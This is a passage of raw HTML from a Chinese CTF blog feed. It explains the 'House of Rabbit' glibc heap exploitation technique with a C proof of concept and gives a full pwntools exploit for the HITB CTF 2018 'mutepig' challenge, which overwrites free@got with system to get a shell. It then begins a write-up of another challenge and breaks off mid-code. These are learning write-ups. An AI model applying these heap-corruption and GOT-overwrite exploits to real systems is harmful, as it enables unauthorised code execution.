Link unsorted bins to appropriate list</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5. Link unsorted bins to appropriate list\n"</span></span><br><span class="line"><span class="string">"  Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate huge chunk.\n"</span></span><br><span class="line"><span class="string">"  Now, fake_chunk1 link to largebin[126](max).\n"</span></span><br><span class="line"><span class="string">"  Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. Overwrite targer variable</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6. Overwrite targer variable on .data\n"</span></span><br><span class="line"><span class="string">"  target is at %p\n"</span></span><br><span class="line"><span class="string">"  Before : %s\n"</span></span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0x10 byte at %p, and overwrite.\n"</span>, victim);</span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  After  : %s\n"</span>, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对这个利用方法进行分步解析</p><h2 id="步骤1-增大malloc函数中-mmap分配阈值"><a href="#步骤1-增大malloc函数中-mmap分配阈值" class="headerlink" title="步骤1 增大malloc函数中 mmap分配阈值"></a>步骤1 增大malloc函数中 mmap分配阈值</h2><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下：</p><p>分配代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) </span><br><span class="line">   &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">   &#123;</span><br><span class="line">      ……</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>阈值改变：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long sum;</span><br><span class="line">sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br></pre></td></tr></table></figure><p>因此在第一阶段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br></pre></td></tr></table></figure><p>第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000</p><p><img src="/img/house_of_rabbit/1.png" alt=""></p><h2 id="步骤2-申请小堆块并放入fastbin"><a href="#步骤2-申请小堆块并放入fastbin" class="headerlink" title="步骤2  申请小堆块并放入fastbin"></a>步骤2  申请小堆块并放入fastbin</h2><p>首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br></pre></td></tr></table></figure><p>此时，对应的堆结构是：</p><p><img src="/img/house_of_rabbit/2.png" alt=""></p><h2 id="步骤3-伪造堆块并劫持至fastbin"><a href="#步骤3-伪造堆块并劫持至fastbin" class="headerlink" title="步骤3 伪造堆块并劫持至fastbin"></a>步骤3 伪造堆块并劫持至fastbin</h2><p>在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。</p><p>利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br></pre></td></tr></table></figure><p>此时，堆块状态如下：</p><p><img src="/img/house_of_rabbit/3.png" alt=""></p><h2 id="步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><a href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin" class="headerlink" title="步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin"></a>步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</h2><p>在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。</p><p>触发代码如下：(malloc.c 4071)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0  0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应步骤代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br></pre></td></tr></table></figure><p>步骤结束后，内存分布如下：</p><p><img src="/img/house_of_rabbit/4.png" alt=""></p><h2 id="步骤5-分配内存-使伪造堆块进入large-bin"><a href="#步骤5-分配内存-使伪造堆块进入large-bin" class="headerlink" title="步骤5 分配内存 使伪造堆块进入large bin"></a>步骤5 分配内存 使伪造堆块进入large bin</h2><p>当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000)</p><p>malloc检测如下（malloc.c 3473）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">           malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                            chunk2mem (victim), av);</span><br><span class="line">         size = chunksize (victim);</span><br></pre></td></tr></table></figure><p>步骤代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. Link unsorted bins to appropriate list</span><br><span class="line">printf(&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">&quot;  Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">gbuf[3] = 0xa00001;</span><br><span class="line">malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">gbuf[3] = 0xfffffffffffffff1;</span><br></pre></td></tr></table></figure><p>最终，程序的堆块布局如下：</p><p><img src="/img/house_of_rabbit/5.png" alt=""></p><h2 id="步骤6-任意内存分配"><a href="#步骤6-任意内存分配" class="headerlink" title="步骤6 任意内存分配"></a>步骤6 任意内存分配</h2><p>当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 6. Overwrite targer variable</span><br><span class="line">printf(&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">&quot;  target is at %p\n&quot;</span><br><span class="line">&quot;  Before : %s\n&quot;</span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line">malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">victim = malloc(0x10);</span><br><span class="line">printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;  After  : %s\n&quot;, target);</span><br></pre></td></tr></table></figure><h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="HITB-CTF-2018-mutepig"><a href="#HITB-CTF-2018-mutepig" class="headerlink" title="HITB CTF 2018       mutepig"></a>HITB CTF 2018       mutepig</h2><p>题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。</p><p>坑点在于此题没有输出，调试比较坑。另外需要注意<strong>利用方法</strong>中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'mutepig'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./mutepig'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.128.158'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(type,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(type))</span><br><span class="line">p.send(content)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content1,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.send(content1)</span><br><span class="line">p.send(content2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bss_list = <span class="number">0x06020C0</span></span><br><span class="line">bss_can_be_edit = <span class="number">0x602120</span></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_0'</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_1'</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'p4nda_2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'p4nda_3'</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>)+<span class="string">'\0'</span>*<span class="number">15</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xA00001</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_4'</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0xfffffffffffffff0</span>)+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">add(<span class="number">0x3419</span>,<span class="string">'p4nda_5'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">1</span>,p64(elf.got[<span class="string">'free'</span>])[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.symbols[<span class="string">'system'</span>])[:<span class="number">-1</span>],<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/house_of_rabbit/mutepig">题目</a></p>]]></content>
    
    <summary type="html">
    
      House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到任意地址分配的目的。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HITB gsec CTF Qual 2018 部分PWN题解</title>
    <link href="http://p4nda.top/2018/04/17/hitb2018/"/>
    <id>http://p4nda.top/2018/04/17/hitb2018/</id>
    <published>2018-04-17T05:40:06.000Z</published>
    <updated>2018-10-03T12:47:22.336Z</updated>
    
    <content type="html"><![CDATA[<h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><p>此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 bin             struc ; (sizeof=0x20, mappedto_1)</span><br><span class="line">00000000 field_0         dq ?</span><br><span class="line">00000008 field_8         dd ?</span><br><span class="line">0000000C field_C         dd ?</span><br><span class="line">00000010 fd              dq ?</span><br><span class="line">00000018 bk              dq ?</span><br><span class="line">00000020 bin             ends</span><br></pre></td></tr></table></figure><p>其中第一个函数，是初始化函数，首先申请了一个0x20的数据块作为第一个堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">funtion1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// ST18_8@1</span></span><br><span class="line">  bin *ptr; <span class="comment">// rax@1</span></span><br><span class="line">  bin *mem; <span class="comment">// ST10_8@1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx@1</span></span><br><span class="line"></span><br><span class="line">  v0 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  ptr = (bin *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  ptr-&gt;fd = <span class="number">0L</span>L;</span><br><span class="line">  ptr-&gt;bk = <span class="number">0L</span>L;</span><br><span class="line">  mem = (bin *)bss_once_mem;</span><br><span class="line">  bss_once_mem = ptr;</span><br><span class="line">  ptr-&gt;fd = (__int64)&amp;unk_202020;</span><br><span class="line">  ptr-&gt;bk = (__int64)mem;</span><br><span class="line">  mem-&gt;fd = (__int64)ptr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"suceess."</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个函数，可以编辑上述堆块，造成可以覆写fd、bk指针，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">funtion2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx@4</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( bss_once_flag == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write_(bss_once_mem, <span class="number">0x20</span>u);</span><br><span class="line">    bss_once_flag = <span class="number">1</span>;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"success."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个函数，实现了一个unlink操作，由于第二个函数导致内存任意写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">funtion3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span 